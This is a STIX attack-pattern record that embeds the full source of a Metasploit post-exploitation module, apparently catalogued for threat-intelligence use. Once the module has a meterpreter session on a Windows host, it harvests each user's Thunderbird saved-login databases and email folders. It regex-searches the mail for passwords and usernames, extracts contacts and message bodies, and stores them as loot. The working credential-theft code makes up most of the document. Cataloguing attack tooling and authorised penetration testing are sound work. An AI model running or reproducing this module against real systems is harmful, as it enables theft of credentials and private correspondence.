{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d6250da1-08d8-45f2-bf45-e5706e4957c3",
    "created": "2024-08-14T16:33:08.243644Z",
    "modified": "2024-08-14T16:33:08.243647Z",
    "name": "Thunderbird credential gatherer",
    "description": " PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems. PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries. Further details can be found in the module documentation. This is a module that searches for thunderbird credentials on a windows remote host.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/thunderbird.rb",
            "external_id": "thunderbird.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  # this associative array defines the artifacts known to PackRat\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::Windows::Packrat\n\n  ARTIFACTS =\n    {\n      application: 'thunderbird',\n      app_category: 'emails',\n      gatherable_artifacts: [\n        {\n          filetypes: 'logins',\n          path: 'AppData',\n          dir: 'Thunderbird',\n          artifact_file_name: 'signons.sqlite',\n          description: \"Thunderbird's saved Username and Passwords\",\n          credential_type: 'sqlite',\n          sql_search: [\n            {\n              sql_description: \"Database Commands which exports Thunderbird's Login data\",\n              sql_table: 'logins',\n              sql_column: 'username_value, action_url'\n            }\n          ]\n        },\n        {\n          filetypes: 'logins',\n          path: 'AppData',\n          dir: 'Thunderbird',\n          artifact_file_name: 'key3.db',\n          description: \"Thunderbird's saved Username and Passwords\",\n          credential_type: 'binary'\n        },\n        {\n          filetypes: 'logins',\n          path: 'AppData',\n          dir: 'Thunderbird',\n          artifact_file_name: 'cert8.db',\n          description: \"Thunderbird's saved Username and Passwords\",\n          credential_type: 'binary'\n        },\n        {\n          filetypes: 'received_emails',\n          path: 'AppData',\n          dir: 'Thunderbird',\n          artifact_file_name: 'Inbox',\n          description: \"Thunderbird's received emails\",\n          credential_type: 'text',\n          regex_search: [\n            {\n              extraction_description: 'Searches for credentials (USERNAMES/PASSWORDS)',\n              extraction_type: 'credentials',\n              regex: [\n                '(?i-mx:password.*)',\n                '(?i-mx:username.*)'\n              ]\n            },\n            {\n              extraction_description: 'searches for Email TO/FROM address',\n              extraction_type: 'Email addresses',\n              regex: [\n                '(?i-mx:to:.*)',\n                '(?i-mx:from:.*)'\n              ]\n            }\n          ]\n        },\n        {\n          filetypes: 'sent_emails',\n          path: 'AppData',\n          dir: 'Thunderbird',\n          artifact_file_name: 'Sent',\n          description: \"Thunderbird's sent emails\",\n          credential_type: 'text',\n          regex_search: [\n            {\n              extraction_description: 'Searches for credentials (USERNAMES/PASSWORDS)',\n              extraction_type: 'credentials',\n              regex: [\n                '(?i-mx:password.*)',\n                '(?i-mx:username.*)'\n              ]\n            },\n            {\n              extraction_description: 'searches for Email TO/FROM address',\n              extraction_type: 'Email addresses',\n              regex: [\n                '(?i-mx:to:.*)',\n                '(?i-mx:from:.*)'\n              ]\n            }\n          ]\n        },\n        {\n          filetypes: 'deleted_emails',\n          path: 'AppData',\n          dir: 'Thunderbird',\n          artifact_file_name: 'Trash',\n          description: \"Thunderbird's Deleted emails\",\n          credential_type: 'text',\n          regex_search: [\n            {\n              extraction_description: 'Searches for credentials (USERNAMES/PASSWORDS)',\n              extraction_type: 'credentials',\n              regex: [\n                '(?i-mx:password.*)',\n                '(?i-mx:username.*)'\n              ]\n            },\n            {\n              extraction_description: 'searches for Email TO/FROM address',\n              extraction_type: 'Email addresses',\n              regex: [\n                '(?i-mx:to:.*)',\n                '(?i-mx:from:.*)'\n              ]\n            }\n          ]\n        },\n        {\n          filetypes: 'draft_emails',\n          path: 'AppData',\n          dir: 'Thunderbird',\n          artifact_file_name: 'Drafts',\n          description: \"Thunderbird's unsent emails\",\n          credential_type: 'text',\n          regex_search: [\n            {\n              extraction_description: 'Searches for credentials (USERNAMES/PASSWORDS)',\n              extraction_type: 'credentials',\n              regex: [\n                '(?i-mx:password.*)',\n                '(?i-mx:username.*)'\n              ]\n            },\n            {\n              extraction_description: 'searches for Email TO/FROM address',\n              extraction_type: 'Email addresses',\n              regex: [\n                '(?i-mx:to:.*)',\n                '(?i-mx:from:.*)'\n              ]\n            }\n          ]\n        },\n        {\n          filetypes: 'database',\n          path: 'AppData',\n          dir: 'Thunderbird',\n          artifact_file_name: 'global-messages-db.sqlite',\n          description: 'emails info',\n          credential_type: 'sqlite',\n          sql_search: [\n            {\n              sql_description: 'Database Commands which exports Contacts',\n              sql_table: 'contacts',\n              sql_column: 'name'\n            },\n            {\n              sql_description: 'Conversation Subject',\n              sql_table: 'conversations',\n              sql_column: 'subject'\n            },\n            {\n              sql_description: 'email address identities',\n              sql_table: 'identities',\n              sql_column: 'value'\n            },\n            {\n              sql_description: \"Email's\",\n              sql_table: 'messagesText_content',\n              sql_column: 'c3author, c4recipients, c1subject, c0body'\n            }\n          ]\n        }\n      ]\n    }.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Thunderbird credential gatherer',\n        'Description' => %q{\n          PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.\n          PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.\n          Further details can be found in the module documentation.\n          This is a module that searches for thunderbird credentials on a windows remote host.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Kazuyoshi Maruta',\n          'Daniel Hallsworth',\n          'Barwar Salim M',\n          'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),\n        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),\n        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),\n        # enumerates the options based on the artifacts that are defined below\n        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', ARTIFACTS[:gatherable_artifacts].map { |k| k[:filetypes] }.uniq.unshift('All')])\n      ]\n    )\n  end\n\n  def run\n    print_status('Filtering based on these selections:  ')\n    print_status(\"ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}\")\n    print_status(\"STORE_LOOT: #{datastore['STORE_LOOT']}\")\n    print_status(\"EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\\n\")\n\n    # used to grab files for each user on the remote host\n    grab_user_profiles.each do |userprofile|\n      run_packrat(userprofile, ARTIFACTS)\n    end\n\n    print_status 'PackRat credential sweep Completed'\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}